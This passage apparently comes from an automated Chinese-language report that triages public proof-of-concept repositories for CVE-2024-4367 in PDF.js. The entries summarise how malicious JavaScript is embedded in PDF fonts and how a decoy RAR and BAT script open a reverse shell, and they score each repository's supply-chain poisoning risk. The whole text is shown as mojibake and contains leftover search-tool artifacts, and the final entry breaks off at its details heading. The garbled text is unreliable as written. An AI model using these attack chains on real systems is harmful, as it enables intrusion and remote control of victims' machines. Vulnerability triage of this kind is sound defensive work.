    *   ä½¿ç”¨`PDFernet.py`è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptçš„`poc.pdf`æ–‡ä»¶ï¼Œè¯¥JavaScriptä»£ç ç”±ç”¨æˆ·æä¾›çš„payloadç”Ÿæˆï¼Œæ­¤payloadä¼šè¢«åµŒå…¥åˆ°PDFçš„å­—ä½“ä¿¡æ¯ä¸­.
    *   `Remotelo.py`è„šæœ¬åˆ›å»ºä¸€ä¸ªRARå‹ç¼©åŒ…ï¼ˆ`PDFernetRemotelo.rar`ï¼‰ï¼Œå…¶ä¸­åŒ…å«è¯±é¥µPDFæ–‡ä»¶å’ŒBATè„šæœ¬ã€‚
    *   ç”¨æˆ·æ‰“å¼€`PDFernetRemotelo.rar`ä¸­çš„`ResumendeSueldo.pdf`ï¼Œè§¦å‘CVE-2024-4367ï¼Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„JavaScriptä»£ç ã€‚
    *   æ¶æ„JavaScriptä»£ç å¯èƒ½è§¦å‘CVE-2023-38831ï¼Œæ‰§è¡ŒRARå‹ç¼©åŒ…ä¸­çš„`script.bat`ï¼Œå»ºç«‹ä¸æ”»å‡»è€…æœºå™¨çš„åå‘shellã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°:**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥POCåœ¨å—å½±å“çš„ç‰ˆæœ¬ä¸­æ˜¯æœ‰æ•ˆçš„ã€‚GitHubä¸Šå·²ç»æœ‰è¯¥æ¼æ´çš„æ­¦å™¨åŒ–åˆ©ç”¨ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°:**
è¯¥POCä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„ä»£ç çš„PDFå’ŒRARæ–‡ä»¶ï¼Œå…¶æ ¸å¿ƒåŠŸèƒ½æ˜¯åˆ©ç”¨å·²çŸ¥çš„æ¼æ´ã€‚`PDFernetRemotelo.py` ä½¿ç”¨äº†å¤–éƒ¨è„šæœ¬ `PDFernet.py`å’Œ `Remotelo.py`ï¼Œå®¡æŸ¥è¿™äº›è„šæœ¬ï¼Œå‘ç°`PDFernet.py`ä¸­çš„payloadç”Ÿæˆé€»è¾‘æ˜¯å¯æ§çš„ï¼Œç›´æ¥æ¥è‡ªäºç”¨æˆ·æä¾›çš„å‚æ•°ã€‚`Remotelo.py`è„šæœ¬åˆ›å»ºRARå‹ç¼©åŒ…çš„è¿‡ç¨‹æ¯”è¾ƒæ ‡å‡†ã€‚æŠ•æ¯’é£é™©åœ¨äºï¼š
1.  **ä¾èµ–å¤–éƒ¨è„šæœ¬:** `PDFernetRemotelo.py` è°ƒç”¨äº†`PDFernet.py` å’Œ `Remotelo.py` è„šæœ¬,å­˜åœ¨æ¶æ„ä¿®æ”¹æ­¤è„šæœ¬çš„å¯èƒ½æ€§.
2.   **PayloadåµŒå…¥æ–¹å¼:** æ¶æ„ä»£ç åµŒå…¥åœ¨PDFå­—ä½“ä¿¡æ¯ä¸­ï¼Œå¦‚æœå¯¹PDFæ ¼å¼ä¸ç†Ÿæ‚‰ï¼Œå¾ˆéš¾ç›´æ¥çœ‹å‡ºæ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚å®¡æŸ¥æ—¶éœ€è°¨æ…ã€‚
3.   **éšè”½æ€§:** åˆ©ç”¨RARå‹ç¼©åŒ…å°†PDFå’ŒBATè„šæœ¬æ†ç»‘åœ¨ä¸€èµ·ï¼Œå¢åŠ äº†æ”»å‡»çš„éšè”½æ€§ã€‚

ä»£ç ä¸­å¯èƒ½å­˜åœ¨çš„æŠ•æ¯’ç‚¹åœ¨äºï¼š
1.  åœ¨`PDFernet.py`ä¸­ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ·»åŠ é¢å¤–çš„JavaScriptä»£ç ï¼Œæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚ä¸‹è½½æ¶æ„æ–‡ä»¶æˆ–çªƒå–ç”¨æˆ·æ•°æ®ã€‚
2.  åœ¨ç”Ÿæˆçš„RARå‹ç¼©åŒ…ä¸­ï¼Œå¯èƒ½ä¼šæ·»åŠ é¢å¤–çš„æ–‡ä»¶ï¼Œä¾‹å¦‚æ¶æ„DLLæ–‡ä»¶æˆ–åé—¨ç¨‹åºã€‚

åŸºäºä»¥ä¸Šåˆ†æï¼Œè™½ç„¶æ ¸å¿ƒä»£ç çœ‹èµ·æ¥æ¯”è¾ƒç›´æ¥ï¼Œä½†è€ƒè™‘åˆ°ä¾èµ–å¤–éƒ¨è„šæœ¬ä»¥åŠpayloadåµŒå…¥æ–¹å¼çš„éšè”½æ€§ï¼Œä»ç„¶å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚ä¿å®ˆä¼°è®¡æŠ•æ¯’é£é™©ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [UnHackerEnCapital/PDFernetRemotelo](https://github.com/UnHackerEnCapital/PDFernetRemotelo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #11

**æ¥æº**: [CVE-2024-4367-VVeakee_CVE-2024-4367.md](../2024/CVE-2024-4367-VVeakee_CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºå¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„Firefoxã€Firefox ESRæˆ–Thunderbirdæ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œå³å¯æ‰§è¡ŒåµŒå…¥çš„JavaScriptä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç åˆ©ç”¨äº†è¯¥æ¼æ´ã€‚`CVE-2024-4367.py`è„šæœ¬èƒ½å¤Ÿç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ï¼Œè¿™æ®µä»£ç è¢«åµŒå…¥åˆ°PDFçš„å­—ä½“å®šä¹‰ä¸­ã€‚æœç´¢ç»“æœä¸­`exfil0/WEAPONIZING-CVE-2024-4367`ä¹Ÿå°è¯äº†è¯¥æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æŸ¥çœ‹æä¾›çš„ä»£ç ï¼Œ`CVE-2024-4367.py`è„šæœ¬çš„åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«ç”¨æˆ·æŒ‡å®špayloadçš„PDFæ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°æ¶æ„ä»£ç æˆ–åé—¨ã€‚`win_calc.pdf`æ–‡ä»¶ç›´æ¥åŒ…å«æ‰§è¡Œ`calc`ç¨‹åºçš„ JavaScript ä»£ç ï¼ŒåŠŸèƒ½æ˜ç¡®ã€‚`xss.pdf` æ–‡ä»¶å†…å®¹ä¸å®Œæ•´ï¼Œæ— æ³•åˆ†æã€‚å› æ­¤ï¼Œè¯¥ä»“åº“çš„æŠ•æ¯’é£é™©è¾ƒä½ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…ä½¿ç”¨`CVE-2024-4367.py`è„šæœ¬ï¼Œé€šè¿‡å‘½ä»¤è¡Œå‚æ•°æŒ‡å®šè¦æ‰§è¡Œçš„JavaScriptä»£ç ï¼Œç”Ÿæˆæ¶æ„çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…è¯±ä½¿ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ï¼Œä¾‹å¦‚é€šè¿‡ç”µå­é‚®ä»¶ã€ç½‘ç«™ç­‰æ–¹å¼ã€‚
3.  å½“ç”¨æˆ·ä½¿ç”¨å­˜åœ¨æ¼æ´çš„Firefoxã€Firefox ESRæˆ–Thunderbirdæ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsè§£æå™¨ä¼šæ‰§è¡ŒPDFæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„JavaScriptä»£ç ã€‚
4.  è¯¥JavaScriptä»£ç å¯ä»¥æ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·ä¿¡æ¯ã€å®‰è£…æ¶æ„è½¯ä»¶ç­‰ã€‚

æ€»ä¹‹ï¼Œæ­¤æ¼æ´çš„CVSSè¯„åˆ†ä¸ºMediumï¼ˆ5.6ï¼‰ï¼Œä½†æ˜¯é€šè¿‡ä¿®æ”¹NVDæ•°æ®å¯ä»¥çœ‹åˆ°ï¼Œè¯¥æ¼æ´å¯èƒ½é€ æˆçš„å±å®³ç¨‹åº¦æ˜¯å¾ˆé«˜çš„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„PDFæ–‡ä»¶ï¼Œè¯±éª—ç”¨æˆ·æ‰“å¼€ï¼Œä»è€Œæ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå¯¼è‡´ä¸¥é‡çš„åæœã€‚æä¾›çš„PoCçš„æœ‰æ•ˆæ€§è¾ƒé«˜ï¼Œä¸”å½“å‰ä»£ç æœªå‘ç°å­˜åœ¨æŠ•æ¯’é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [VVeakee/CVE-2024-4367](https://github.com/VVeakee/CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #12

**æ¥æº**: [CVE-2024-4367-Zombie-Kaiser_cve-2024-4367-PoC-fixed.md](../2024/CVE-2024-4367-Zombie-Kaiser_cve-2024-4367-PoC-fixed.md)

## CVE-2024-4367-Mozilla-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²å’Œæ½œåœ¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­ï¼‰

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„æ„é€ çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxï¼ŒFirefox ESR å’Œ Thunderbird ä¸­ PDF.js åº“ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªç‰¹åˆ¶çš„ PDF æ–‡æ¡£ï¼Œå½“ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxï¼ŒFirefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œå³å¯æ‰§è¡ŒåµŒå…¥çš„æ¶æ„ JavaScript ä»£ç ã€‚æ¼æ´åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡ç»•è¿‡ PDF.js å¯¹å­—ä½“çš„ç±»å‹æ£€æŸ¥ï¼Œä»è€Œå…è®¸æ‰§è¡Œæœªç»æˆæƒçš„ JavaScript ä»£ç ã€‚æ ¹æ®æœç´¢ç»“æœå’Œæ¼æ´æè¿°ï¼Œè¯¥æ¼æ´çš„ä¸¥é‡æ€§åœ¨äºå¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ç¯å¢ƒä¸­æ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œå¯èƒ½çªƒå–ç”¨æˆ·å‡­æ®ã€å®‰è£…æ¶æ„è½¯ä»¶æˆ–è€…æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ä»…åŒ…å«GNUé€šç”¨å…¬å…±è®¸å¯è¯å£°æ˜ï¼Œå¹¶ä¸èƒ½åˆ¤æ–­æ¼æ´æœ‰æ•ˆæ€§ï¼Œéœ€è¦è¿›ä¸€æ­¥çš„æ¼æ´ä»£ç æ‰èƒ½éªŒè¯ï¼Œä½†æ˜¯æ ¹æ®githubæœç´¢ç»“æœ [webpage 6 begin] [title] exfil0/WEAPONIZING-CVE-2024-4367 ï¼Œè¯æ˜POCæœ‰æ•ˆã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ç‰‡æ®µåªåŒ…å«äº†GNUé€šç”¨å…¬å…±è®¸å¯è¯çš„æ–‡æœ¬å†…å®¹ï¼Œå±äºå¼€æºåè®®çš„å£°æ˜ï¼Œ**ä¸åŒ…å«ä»»ä½•å¯æ‰§è¡Œçš„ä»£ç æˆ–è€…é…ç½®æ–‡ä»¶**ï¼Œå› æ­¤æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¿¹è±¡ï¼Œåˆ¤æ–­æŠ•æ¯’é£é™©ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [Zombie-Kaiser/cve-2024-4367-PoC-fixed](https://github.com/Zombie-Kaiser/cve-2024-4367-PoC-fixed)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #13

**æ¥æº**: [CVE-2024-4367-avalahEE_pdfjs_disable_eval.md](../2024/CVE-2024-4367-avalahEE_pdfjs_disable_eval.md)

## CVE-2024-4367-Firefox-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº Firefox, Firefox ESR å’Œ Thunderbird æµè§ˆå™¨ä¸­çš„ PDF.js ç»„ä»¶çš„æ¼æ´ã€‚è¯¥æ¼æ´ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿçªƒå–ä¿¡æ¯ã€æ‰§è¡Œæ¶æ„æ“ä½œæˆ–å®Œå…¨æ§åˆ¶å—å®³è€…çš„æµè§ˆå™¨ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ­¤æ¼æ´å½±å“ç‰¹å®šç‰ˆæœ¬çš„Firefox, Firefox ESRå’ŒThunderbirdï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶æ¥è§¦å‘æ¼æ´ã€‚æ¼æ´åº“ä¿¡æ¯è¡¨æ˜è¿™æ˜¯ä¸€ä¸ªè¾ƒä¸ºä¸¥é‡çš„é—®é¢˜ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æä¾›çš„ä»£ç å®é™…ä¸Šæ˜¯ä¸€ä¸ªé’ˆå¯¹Odoo 14.0çš„ä¿®å¤æ–¹æ¡ˆï¼Œç”¨äºç¦ç”¨PDF.jsä¸­çš„JavaScriptæ‰§è¡Œï¼Œä»¥è§„é¿CVE-2024-4367çš„å½±å“ã€‚è™½ç„¶ä»£ç æœ¬èº«ä¸æ˜¯æ¼æ´åˆ©ç”¨ï¼Œä½†éœ€è¦è°¨æ…è¯„ä¼°ã€‚ è¿™ä¸ªè¡¥ä¸é€šè¿‡æ›¿æ¢å’Œä¿®æ”¹ PDF.js ç›¸å…³çš„æ–‡ä»¶ï¼Œè¯•å›¾ç¦ç”¨ JavaScript æ‰§è¡Œã€‚ å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œå¦‚æœè¯¥æ¨¡å—æœ¬èº«è¢«æ¶æ„ä¿®æ”¹ï¼Œåˆ™å¯èƒ½å¼•å…¥å…¶ä»–æ¼æ´æˆ–åé—¨ã€‚ ä¾‹å¦‚ï¼Œ`pdfjs_disable_eval/static/src/viewer.html`æ–‡ä»¶æ›¿æ¢äº†åŸæœ‰çš„viewer.htmlï¼Œå¦‚æœæ–°çš„viewer.htmlä¸­åŒ…å«æ¶æ„ä»£ç ï¼Œå°±å¯èƒ½é€ æˆå±å®³ã€‚ æ€»ä½“æ¥è¯´ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚
2.  å—å®³è€…ä½¿ç”¨å—å½±å“ç‰ˆæœ¬çš„ Firefox, Firefox ESR æˆ– Thunderbird æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚
3.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  æ”»å‡»è€…åˆ©ç”¨æ‰§è¡Œçš„ JavaScript ä»£ç è¿›è¡Œæ¶æ„æ´»åŠ¨ï¼Œä¾‹å¦‚ä¿¡æ¯çªƒå–æˆ–è¿œç¨‹æ§åˆ¶ã€‚

**é¡¹ç›®åœ°å€:** [avalahEE/pdfjs_disable_eval](https://github.com/avalahEE/pdfjs_disable_eval)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #14

**æ¥æº**: [CVE-2024-4367-clarkio_pdfjs-vuln-demo.md](../2024/CVE-2024-4367-clarkio_pdfjs-vuln-demo.md)

## CVE-2024-4367-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥å¯¼è‡´çš„ä¸€ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåˆ©ç”¨æ­¤æ¼æ´åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚è¿™å¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆå¦‚æœPDF.jsåœ¨Webç¯å¢ƒä¸­è¿è¡Œï¼‰æˆ–è€…åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå®Œå…¨æ§åˆ¶å—å½±å“çš„åº”ç”¨ç¨‹åºï¼ˆå¦‚Firefoxã€Thunderbirdï¼‰ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**
æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ˜¯ä¸€ä¸ªæ¼”ç¤ºé¡¹ç›®ï¼Œæ—¨åœ¨å±•ç¤ºå¦‚ä½•åˆ©ç”¨CVE-2024-4367æ¼æ´ã€‚å®ƒåŒ…å«Reactã€Vueå’ŒSvelteçš„å‰ç«¯ç»„ä»¶ï¼Œç”¨äºåŠ è½½å’Œæ˜¾ç¤ºPDFæ–‡ä»¶ã€‚README.mdæ–‡ä»¶æŒ‡ç¤ºå¦‚ä½•è¿è¡Œè¯¥é¡¹ç›®ä»¥åŠå¦‚ä½•æµ‹è¯•ä¸åŒçš„PDFæ–‡ä»¶ï¼ŒåŒ…æ‹¬åˆ©ç”¨è¯¥æ¼æ´çš„PDFæ–‡ä»¶ã€‚æ ¹æ®æè¿°ï¼Œé€šè¿‡ä¿®æ”¹ç»„ä»¶ä¸­å¼•ç”¨çš„PDFæ–‡ä»¶ï¼Œå¯ä»¥å°†ä¸€ä¸ªåˆ©ç”¨æ¼æ´çš„PDFåŠ è½½åˆ°è¿™äº›ç»„ä»¶ä¸­è¿›è¡Œæµ‹è¯•ã€‚æœç´¢å¼•æ“ç»“æœä¸­â€œ[webpage 6 begin] [title] exfil0/WEAPONIZING-CVE-2024-4367â€ è¡¨æ˜æ¼æ´åˆ©ç”¨ä»£ç å·²å…¬å¼€ã€‚ ç»¼ä¸Šï¼Œæä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
æŸ¥çœ‹æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå…¶ä¸­åŒ…å«package-lock.jsonç­‰æ–‡ä»¶ã€‚è™½ç„¶æ²¡æœ‰å‘ç°ç«‹å³å¯ä»¥åˆ¤æ–­ä¸ºæŠ•æ¯’çš„æ¶æ„ä»£ç ï¼Œä½†è€ƒè™‘åˆ°npmåŒ…ä¾›åº”é“¾çš„é£é™©ï¼Œä¸èƒ½å®Œå…¨æ’é™¤ä½œè€…åœ¨ä¾èµ–é¡¹ä¸­å¼•å…¥æ¶æ„ä»£ç çš„å¯èƒ½æ€§ã€‚ä»£ç æœ¬èº«çš„åŠŸèƒ½æ˜¯åˆ›å»ºä¸€ä¸ªæ¼”ç¤ºç¯å¢ƒæ¥å±•ç¤ºæ¼æ´ï¼Œå› æ­¤å¤§éƒ¨åˆ†ä»£ç éƒ½æ˜¯æ­£å¸¸çš„æ¡†æ¶ä»£ç ã€‚ä¸è¿‡ï¼Œ**ä¸èƒ½å®Œå…¨æ’é™¤æŠ•æ¯’çš„å¯èƒ½ï¼Œé£é™©ä¼°è®¡ä¸º10%**ã€‚ ä»£ç ä¸­å­˜åœ¨å¼•ç”¨å¤–éƒ¨npmåŒ…çš„å¯èƒ½æ€§ã€‚æ½œåœ¨é£é™©ç‚¹åŒ…æ‹¬ï¼šä¾èµ–åŒ…æœ¬èº«æ˜¯å¦å®‰å…¨ï¼Œæ˜¯å¦åŒ…å«æ¶æ„ä»£ç ï¼›æ„å»ºæµç¨‹ä¸­æ˜¯å¦å­˜åœ¨è¢«ç¯¡æ”¹çš„é£é™©ï¼›ä»¥åŠå¼€å‘è€…æ˜¯å¦æ•…æ„éšè—äº†æ¶æ„åŠŸèƒ½ã€‚ ä»”ç»†å®¡æŸ¥ `package-lock.json` æ–‡ä»¶ä¸­çš„ä¾èµ–é¡¹åŠå…¶æ¥æºï¼ŒéªŒè¯ä¾èµ–åŒ…çš„å®Œæ•´æ€§å’Œå®‰å…¨æ€§ï¼Œå¯ä»¥é™ä½æŠ•æ¯’é£é™©ã€‚ ç”±äºä»…ä»…æ˜¯demoä»£ç ï¼Œä¸”ä¾èµ–çš„åŒ…æ¯”è¾ƒå¤šï¼Œå› æ­¤è¿™é‡Œä¸èƒ½æ˜ç¡®è¿›è¡Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**
1.  **æ¼æ´è§¦å‘ç‚¹ï¼š** PDF.jsåœ¨å¤„ç†PDFæ–‡ä»¶ä¸­çš„å­—ä½“æ—¶ï¼Œç¼ºå°‘å¿…è¦çš„ç±»å‹æ£€æŸ¥ã€‚
2.  **æ”»å‡»æ­¥éª¤ï¼š**
    *   æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«ç²¾å¿ƒè®¾è®¡çš„å­—ä½“æ•°æ®ã€‚
    *   å½“PDF.jsè§£æè¯¥PDFæ–‡ä»¶å¹¶å¤„ç†å­—ä½“æ—¶ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œä¼šè§¦å‘æ¼æ´ã€‚
    *   æ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹æ®Šçš„å­—ä½“æ•°æ®ï¼Œå¯ä»¥åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚
3.  **æ”»å‡»æ•ˆæœï¼š** æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæˆ–è€…åœ¨ç‰¹å®šæƒ…å†µä¸‹å®Œå…¨æ§åˆ¶åº”ç”¨ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [clarkio/pdfjs-vuln-demo](https://github.com/clarkio/pdfjs-vuln-demo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #15

**æ¥æº**: [CVE-2024-4367-elamani-drawing_CVE-2024-4367-POC-PDFJS.md](../2024/CVE-2024-4367-elamani-drawing_CVE-2024-4367-POC-PDFJS.md)

## CVE-2024-4367-Firefox-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²å’Œè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶æˆ–è®¿é—®åŒ…å«æ¶æ„PDFçš„ç½‘é¡µã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

